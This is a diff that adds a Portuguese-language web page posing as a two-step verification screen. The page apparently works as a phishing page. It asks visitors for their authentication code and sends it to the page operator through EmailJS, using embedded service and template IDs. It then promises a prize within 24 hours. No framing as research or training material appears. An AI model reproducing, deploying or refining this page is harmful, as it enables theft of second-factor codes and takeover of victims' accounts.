@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificação</title>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <style>
+       body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: white; /* Fundo cinza moderno */
+        }
+        .form-container {
+            background-color: white; /* Fundo do formulário branco para contraste */
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        .form-control {
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+        }
+        .submit-button {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 10px;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+        }
+        .submit-button:hover {
+            background-color: #0056b3;
+        }
+        .error-message {
+            color: red;
+            display: none;
+        }
+        h1 {
+            border: 2px solid #007bff; /* Borda azul na frase da verificação */
+            padding: 10px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            background-color: #f0f8ff; /* Fundo leve para o cabeçalho */
+        }
+        .image-container {
+            display: flex;
+            justify-content: space-around;
+            margin-bottom: 20px;
+        }
+        .image-container img {
+            width: 100px; /* Defina o tamanho das imagens */
+            height: auto; /* Mantém a proporção da imagem */
+        }
+    </style>
+    <script>
+        (function() {
+            emailjs.init("y2Y2FotVDMytchPMg"); // Substitua pelo seu user ID
+        })();
+
+        function sendEmail(event) {
+            event.preventDefault(); // Previne o envio padrão do formulário
+
+            const serviceID = "service_uto6ltk"; // Substitua pelo seu Service ID
+            const templateID = "template_wx7bj1m"; // Substitua pelo seu Template ID
+
+            emailjs.sendForm(serviceID, templateID, event.target)
+                .then(() => {
+                    alert('Código enviado! Você ganhará seu prêmio em 24h');
+                    document.getElementById('verification-form').reset(); // Limpa o formulário após envio
+                }, (error) => {
+                    console.error('Erro ao enviar o email:', error);
+                    document.getElementById('error-message').innerText = 'Erro ao enviar o código. Tente novamente.';
+                    document.getElementById('error-message').style.display = 'block';
+                });
+        }
+    </script>
+</head>
+<body>
+    <div class="form-container">
+        <div class="image-container">
+
+        </div>
+        <h1>Verificação de Duas Etapas</h1>
+        <div id="contact-form">
+            <form class="contact-form" onsubmit="sendEmail(event)">
+                <div class="form-group message-form-group">
+                    <input type="text" id="message" name="message" class="form-control input-field" placeholder="Insira o código" required>
+                </div>
+                <div class="form-group message-form-group">
+                    <button type="submit" class="submit-button">Enviar</button>
+                    <div id="error-message" class="error-message"></div>
+                </div>
+            </form>
+        </div>
+    </div>
+</body>
+</html>
